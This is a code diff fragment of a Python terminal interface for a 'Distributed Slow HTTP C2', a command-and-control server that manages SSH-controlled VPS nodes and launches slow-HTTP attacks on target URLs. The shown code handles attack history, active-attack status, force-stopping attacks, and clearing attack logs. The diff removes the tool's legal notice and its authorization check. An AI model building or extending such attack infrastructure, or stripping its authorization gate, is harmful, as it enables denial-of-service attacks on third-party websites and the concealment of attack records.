+            print(f"{Colors.RED}[ERROR] Invalid input{Colors.RESET}")
+        except KeyboardInterrupt:
+            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
+        
+        input("Press Enter to continue...")
+    
+    def attack_history_menu(self):
+        """Display attack history and logs"""
+        sessions = self.db_manager.get_attack_sessions()
+        
+        if not sessions:
+            print(f"{Colors.YELLOW}[INFO] No attack history found{Colors.RESET}")
+            input("Press Enter to continue...")
+            return
+        
+        print(f"\n{Colors.BOLD}ATTACK HISTORY & LOGS{Colors.RESET}")
+        print("=" * 40)
+        
+        # Display sessions
+        for session in sessions:
+            session_id, session_name, target_url, attack_type, status, start_time, end_time = session[0], session[1], session[2], session[4], session[8], session[6], session[7]
+            
+            # Calculate duration
+            if start_time and end_time:
+                start = datetime.fromisoformat(start_time)
+                end = datetime.fromisoformat(end_time)
+                duration = str(end - start).split('.')[0]  # Remove microseconds
+            else:
+                duration = "N/A"
+            
+            # Status color
+            status_color = Colors.GREEN if status == 'completed' else Colors.YELLOW if status == 'running' else Colors.RED
+            
+            print(f"\n{Colors.CYAN}[SESSION {session_id}] {session_name}{Colors.RESET}")
+            print(f"  Target: {target_url}")
+            print(f"  Type: {attack_type.upper()}")
+            print(f"  Status: {status_color}{status.upper()}{Colors.RESET}")
+            print(f"  Started: {start_time[:19] if start_time else 'N/A'}")
+            print(f"  Duration: {duration}")
+            
+            # Show logs for this session
+            print(f"\n{Colors.BOLD}ATTACK LOGS:{Colors.RESET}")
+            print("-" * 30)
+            
             conn = sqlite3.connect(self.db_manager.db_file)
             cursor = conn.cursor()
+            cursor.execute('''
+                SELECT timestamp, log_level, message FROM attack_logs 
+                WHERE session_id = ? ORDER BY timestamp DESC LIMIT 10
+            ''', (session_id,))
             
-            # Count records in each table
-            tables = ['vps_nodes', 'attack_sessions', 'attack_results', 'attack_logs']
-            for table in tables:
-                cursor.execute(f'SELECT COUNT(*) FROM {table}')
-                count = cursor.fetchone()[0]
-                print(f"{table}: {count} records")
-            
-            # Database file size
-            db_size = os.path.getsize(self.db_manager.db_file) / 1024
-            print(f"Database size: {db_size:.2f} KB")
-            
+            logs = cursor.fetchall()
             conn.close()
             
-        except Exception as e:
-            print(f"{Colors.RED}Error: {e}{Colors.RESET}")
+            if logs:
+                for log in logs:
+                    timestamp, level, message = log
+                    level_color = Colors.RED if level == 'ERROR' else Colors.YELLOW if level == 'WARNING' else Colors.GREEN
+                    print(f"  {timestamp[:19]} {level_color}[{level}]{Colors.RESET} {message}")
+            else:
+                print(f"  {Colors.YELLOW}No logs found for this session{Colors.RESET}")
         
         input("\nPress Enter to continue...")
     
-    def clean_old_sessions(self):
-        print(f"\n{Colors.BOLD}CLEAN OLD SESSIONS{Colors.RESET}")
-        print("-" * 25)
+    def system_status_menu(self):
+        """Display system status"""
+        self.clear_screen()
+        self.print_banner()
         
-        days = input("Delete sessions older than how many days? (default 30): ").strip()
+        print(f"\n{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
+        print("=" * 40)
+        
+        # VPS status
+        vps_list = self.db_manager.get_all_vps()
+        online_vps = sum(1 for vps in vps_list if vps[5] == 'online')
+        deployed_vps = sum(1 for vps in vps_list if len(vps) > 10 and vps[10])
+        
+        print(f"\n{Colors.CYAN}VPS NODES:{Colors.RESET}")
+        print(f"  Total: {len(vps_list)}")
+        print(f"  Online: {Colors.GREEN}{online_vps}{Colors.RESET}")
+        print(f"  Offline: {Colors.RED}{len(vps_list) - online_vps}{Colors.RESET}")
+        print(f"  Agents Deployed: {Colors.GREEN}{deployed_vps}{Colors.RESET}")
+        
+        # Active attacks
+        active_attacks = len(self.attack_manager.active_attacks)
+        
+        print(f"\n{Colors.CYAN}ACTIVE ATTACKS:{Colors.RESET}")
+        print(f"  Total: {active_attacks}")
+        
+        if active_attacks > 0:
+            print(f"\n{Colors.CYAN}CURRENT ATTACKS:{Colors.RESET}")
+            for session_id, attack in self.attack_manager.active_attacks.items():
+                duration = (datetime.now() - attack['start_time']).seconds
+                duration_str = f"{duration//3600}h {(duration%3600)//60}m {duration%60}s"
+                
+                print(f"  {session_id}: {attack['session_name']} ({duration_str})")
+        
+        # Database status
+        db_file = self.db_manager.db_file
+        db_exists = os.path.exists(db_file)
+        db_size = os.path.getsize(db_file) if db_exists else 0
+        
+        print(f"\n{Colors.CYAN}DATABASE:{Colors.RESET}")
+        print(f"  Status: {Colors.GREEN}OK{Colors.RESET}" if db_exists else f"{Colors.RED}MISSING{Colors.RESET}")
+        print(f"  Size: {db_size:,} bytes")
+        
+        # Attack logs summary
+        conn = sqlite3.connect(self.db_file)
+        cursor = conn.cursor()
+        cursor.execute('SELECT COUNT(*) FROM attack_logs')
+        total_logs = cursor.fetchone()[0]
+        conn.close()
+        
+        print(f"\n{Colors.CYAN}ATTACK LOGS:{Colors.RESET}")
+        print(f"  Total entries: {total_logs}")
+        
+        input("\nPress Enter to continue...")
+    
+    def advanced_options_menu(self):
+        """Advanced options menu"""
+        while self.running:
+            self.clear_screen()
+            self.print_banner()
+            
+            print(f"\n{Colors.BOLD}ADVANCED OPTIONS{Colors.RESET}")
+            print("=" * 40)
+            
+            menu = f"""
+{Colors.BOLD}DATABASE MANAGEMENT:{Colors.RESET}
+{Colors.GREEN}[1]{Colors.RESET} Backup Database
+{Colors.GREEN}[2]{Colors.RESET} Clear Attack Logs
+{Colors.GREEN}[3]{Colors.RESET} Reset Database
+
+{Colors.BOLD}SYSTEM MANAGEMENT:{Colors.RESET}
+{Colors.GREEN}[4]{Colors.RESET} Clear All SSH Connections
+{Colors.GREEN}[5]{Colors.RESET} Force Stop All Attacks
+{Colors.GREEN}[6]{Colors.RESET} Generate Security Report
+
+{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu
+
+{Colors.YELLOW}Select option (0-6): {Colors.RESET}"""
+            
+            print(menu)
+            choice = input().strip()
+            
+            if choice == '1':
+                self.backup_database()
+            elif choice == '2':
+                self.clear_attack_logs()
+            elif choice == '3':
+                self.reset_database()
+            elif choice == '4':
+                self.clear_ssh_connections()
+            elif choice == '5':
+                self.force_stop_all_attacks()
+            elif choice == '6':
+                self.generate_security_report()
+            elif choice == '0':
+                break
+            else:
+                print(f"{Colors.RED}Invalid option{Colors.RESET}")
+                time.sleep(1)
+    
+    def backup_database(self):
+        """Create a backup of the database"""
         try:
-            days = int(days) if days else 30
-        except ValueError:
-            days = 30
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            backup_file = f"c2_database_backup_{timestamp}.db"
+            
+            # Copy database file
+            import shutil
+            shutil.copy2(self.db_manager.db_file, backup_file)
+            
+            print(f"{Colors.GREEN}[SUCCESS] Database backed up to {backup_file}{Colors.RESET}")
+            print(f"Backup size: {os.path.getsize(backup_file):,} bytes")
+            
+        except Exception as e:
+            print(f"{Colors.RED}[ERROR] Failed to backup database: {str(e)}{Colors.RESET}")
         
-        confirm = input(f"{Colors.RED}Delete sessions older than {days} days? (y/N): {Colors.RESET}").strip().lower()
-        if confirm != 'y':
-            return
-        
+        input("Press Enter to continue...")
+    
+    def clear_attack_logs(self):
+        """Clear all attack logs"""
         try:
             conn = sqlite3.connect(self.db_manager.db_file)
             cursor = conn.cursor()
-            
-            # Delete old sessions and related logs
-            cutoff_date = datetime.now() - timedelta(days=days)
-            cursor.execute('DELETE FROM attack_sessions WHERE start_time < ?', (cutoff_date.isoformat(),))
-            deleted = cursor.rowcount
-            
+            cursor.execute('DELETE FROM attack_logs')
             conn.commit()
             conn.close()
             
-            print(f"{Colors.GREEN}[SUCCESS] Deleted {deleted} old sessions{Colors.RESET}")
+            print(f"{Colors.GREEN}[SUCCESS] All attack logs cleared{Colors.RESET}")
             
         except Exception as e:
-            print(f"{Colors.RED}Error: {e}{Colors.RESET}")
+            print(f"{Colors.RED}[ERROR] Failed to clear logs: {str(e)}{Colors.RESET}")
         
         input("Press Enter to continue...")
     
-    def security_settings_menu(self):
-        print(f"\n{Colors.BOLD}SECURITY SETTINGS{Colors.RESET}")
-        print("-" * 25)
-        
-        print(f"{Colors.GREEN}[1]{Colors.RESET} Regenerate Encryption Key")
-        print(f"{Colors.GREEN}[2]{Colors.RESET} View Security Status")
-        print(f"{Colors.GREEN}[3]{Colors.RESET} Clear Cached Credentials")
-        
-        choice = input(f"\n{Colors.YELLOW}Select option: {Colors.RESET}").strip()
-        
-        if choice == '1':
-            self.regenerate_encryption_key()
-        elif choice == '2':
-            self.show_security_status()
-        elif choice == '3':
-            self.clear_cached_credentials()
-        else:
-            input("Press Enter to continue...")
-    
-    def regenerate_encryption_key(self):
-        confirm = input(f"{Colors.RED}Regenerate encryption key? This will invalidate stored passwords! (y/N): {Colors.RESET}").strip().lower()
-        if confirm != 'y':
-            return
-        
+    def reset_database(self):
+        """Reset the entire database"""
         try:
-            # Remove old key
-            if os.path.exists('key.key'):
-                os.remove('key.key')
+            confirm = input(f"{Colors.RED}WARNING: This will delete ALL data! Are you sure? (y/N): {Colors.RESET}").strip().lower()
             
-            # Create new security manager (generates new key)
-            self.security_manager = SecurityManager()
-            print(f"{Colors.GREEN}[SUCCESS] New encryption key generated{Colors.RESET}")
-            print(f"{Colors.YELLOW}[WARNING] You will need to re-enter VPS passwords{Colors.RESET}")
+            if confirm == 'y':
+                # Remove database file
+                if os.path.exists(self.db_manager.db_file):
+                    os.remove(self.db_manager.db_file)
+                
+                # Reinitialize database
+                self.db_manager.init_database()
+                
+                print(f"{Colors.GREEN}[SUCCESS] Database reset complete{Colors.RESET}")
+            else:
+                print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
+                
+        except Exception as e:
+            print(f"{Colors.RED}[ERROR] Failed to reset database: {str(e)}{Colors.RESET}")
+        
+        input("Press Enter to continue...")
+    
+    def clear_ssh_connections(self):
+        """Clear all SSH connections"""
+        try:
+            self.ssh_manager.close_all_connections()
+            print(f"{Colors.GREEN}[SUCCESS] All SSH connections cleared{Colors.RESET}")
             
         except Exception as e:
-            print(f"{Colors.RED}Error: {e}{Colors.RESET}")
+            print(f"{Colors.RED}[ERROR] Failed to clear connections: {str(e)}{Colors.RESET}")
         
         input("Press Enter to continue...")
     
-    def show_security_status(self):
-        print(f"\n{Colors.BOLD}SECURITY STATUS{Colors.RESET}")
-        print("-" * 20)
-        
-        # Check file permissions
-        db_permissions = oct(os.stat(self.db_manager.db_file).st_mode)[-3:]
-        key_permissions = oct(os.stat('key.key').st_mode)[-3:] if os.path.exists('key.key') else 'N/A'
-        
-        print(f"Database permissions: {db_permissions} {'(secure)' if db_permissions == '600' else '(insecure)'}")
-        print(f"Key file permissions: {key_permissions} {'(secure)' if key_permissions == '600' else '(insecure)'}")
-        print(f"Active SSH connections: {len(self.ssh_manager.connections)}")
-        print(f"Cached credentials: {len(self.ssh_manager.connection_cache)}")
+    def force_stop_all_attacks(self):
+        """Force stop all active attacks"""
+        try:
+            if not self.attack_manager.active_attacks:
+                print(f"{Colors.YELLOW}[INFO] No active attacks to stop{Colors.RESET}")
+            else:
+                for session_id in list(self.attack_manager.active_attacks.keys()):
+                    self.attack_manager.stop_attack(session_id)
+                
+                print(f"{Colors.GREEN}[SUCCESS] All attacks stopped{Colors.RESET}")
+                
+        except Exception as e:
+            print(f"{Colors.RED}[ERROR] Failed to stop attacks: {str(e)}{Colors.RESET}")
         
         input("Press Enter to continue...")
     
-    def clear_cached_credentials(self):
-        confirm = input(f"{Colors.YELLOW}Clear all cached SSH credentials? (y/N): {Colors.RESET}").strip().lower()
-        if confirm == 'y':
-            self.ssh_manager.connection_cache.clear()
-            self.ssh_manager.close_all_connections()
-            print(f"{Colors.GREEN}[SUCCESS] Cached credentials cleared{Colors.RESET}")
+    def generate_security_report(self):
+        """Generate a security report"""
+        try:
+            self.clear_screen()
+            self.print_banner()
+            
+            print(f"\n{Colors.BOLD}SECURITY REPORT{Colors.RESET}")
+            print("=" * 40)
+            
+            # Database statistics
+            conn = sqlite3.connect(self.db_manager.db_file)
+            cursor = conn.cursor()
+            
+            # VPS nodes
+            cursor.execute('SELECT COUNT(*) FROM vps_nodes')
+            total_vps = cursor.fetchone()[0]
+            
+            cursor.execute('SELECT COUNT(*) FROM vps_nodes WHERE status = "online"')
+            online_vps = cursor.fetchone()[0]
+            
+            # Attack sessions
+            cursor.execute('SELECT COUNT(*) FROM attack_sessions')
+            total_sessions = cursor.fetchone()[0]
+            
+            cursor.execute('SELECT COUNT(*) FROM attack_sessions WHERE status = "running"')
+            active_sessions = cursor.fetchone()[0]
+            
+            # Attack logs
+            cursor.execute('SELECT COUNT(*) FROM attack_logs')
+            total_logs = cursor.fetchone()[0]
+            
+            cursor.execute('SELECT COUNT(*) FROM attack_logs WHERE log_level = "ERROR"')
+            error_logs = cursor.fetchone()[0]
+            
+            conn.close()
+            
+            # Display report
+            print(f"\n{Colors.CYAN}DATABASE STATISTICS:{Colors.RESET}")
+            print(f"  VPS Nodes: {total_vps} (Online: {online_vps})")
+            print(f"  Attack Sessions: {total_sessions} (Active: {active_sessions})")
+            print(f"  Attack Logs: {total_logs} (Errors: {error_logs})")
+            
+            print(f"\n{Colors.CYAN}SYSTEM STATUS:{Colors.RESET}")
+            print(f"  Active SSH Connections: {len(self.ssh_manager.connections)}")
+            print(f"  Active Attacks: {len(self.attack_manager.active_attacks)}")
+            
+            print(f"\n{Colors.CYAN}SECURITY METRICS:{Colors.RESET}")
+            print(f"  Error Rate: {(error_logs/total_logs*100):.2f}%" if total_logs > 0 else "  Error Rate: 0.00%")
+            print(f"  VPS Utilization: {(online_vps/total_vps*100):.2f}%" if total_vps > 0 else "  VPS Utilization: 0.00%")
+            
+            print(f"\n{Colors.YELLOW}Report generated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
+            
+        except Exception as e:
+            print(f"{Colors.RED}[ERROR] Failed to generate report: {str(e)}{Colors.RESET}")
         
-        input("Press Enter to continue...")
+        input("\nPress Enter to continue...")
     
     def run(self):
+        """Main TUI loop"""
         while self.running:
+            self.clear_screen()
+            self.print_banner()
+            self.print_menu()
+            
             try:
-                self.clear_screen()
-                self.print_banner()
-                self.print_menu()
-                
                 choice = input().strip()
                 
                 if choice == '1':
@@ -2214,7 +2064,7 @@ class SlowHTTPTUI:
                 elif choice == '2':
                     self.launch_attack_menu()
                 elif choice == '3':
-                    self.monitor_attack()
+                    self.monitor_attacks_menu()
                 elif choice == '4':
                     self.attack_history_menu()
                 elif choice == '5':
@@ -2222,66 +2072,19 @@ class SlowHTTPTUI:
                 elif choice == '6':
                     self.advanced_options_menu()
                 elif choice == '0':
-                    print(f"{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
-                    break
+                    print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
+                    self.running = False
                 else:
-                    print(f"{Colors.RED}[ERROR] Invalid option{Colors.RESET}")
+                    print(f"{Colors.RED}Invalid option{Colors.RESET}")
                     time.sleep(1)
                     
             except KeyboardInterrupt:
-                print(f"\n{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
-                break
+                print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
+                self.running = False
             except Exception as e:
                 print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
-                input("Press Enter to continue...")
+                time.sleep(2)
 
-def main():
-    # Check Python version
-    if sys.version_info < (3, 6):
-        print("Python 3.6+ required")
-        sys.exit(1)
-    
-    # Check dependencies
-    try:
-        import paramiko
-        from cryptography.fernet import Fernet
-        import colorama
-    except ImportError as e:
-        print(f"Missing dependency: {e}")
-        print("Please install: pip install paramiko cryptography colorama")
-        sys.exit(1)
-    
-    # Create necessary directories
-    os.makedirs('logs', exist_ok=True)
-    os.makedirs('config', exist_ok=True)
-    
-    # Legal disclaimer
-    print(f"""
-{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════════════════════╗
-║                               LEGAL NOTICE                                   ║
-╠══════════════════════════════════════════════════════════════════════════════╣
-║ This tool is for EDUCATIONAL and AUTHORIZED PENETRATION TESTING ONLY        ║
-║ Unauthorized use against systems you don't own is ILLEGAL                   ║
-║ Users are solely responsible for compliance with applicable laws             ║
-║                                                                              ║
-║ By proceeding, you acknowledge proper authorization and legal compliance     ║
-╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
-
-""")
-    
-    confirm = input(f"{Colors.YELLOW}Do you have proper written authorization? (yes/no): {Colors.RESET}").strip().lower()
-    if confirm not in ['yes', 'y']:
-        print(f"{Colors.RED}Authorization required. Exiting.{Colors.RESET}")
-        sys.exit(0)
-    
-    # Initialize and run TUI
-    try:
-        print("Starting Distributed Slow HTTP C2 - Educational Version...")
-        tui = SlowHTTPTUI()
-        tui.run()
-    except Exception as e:
-        print(f"Fatal error: {e}")
-        sys.exit(1)
-
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":
+    tui = SlowHTTPTUI()
+    tui.run()
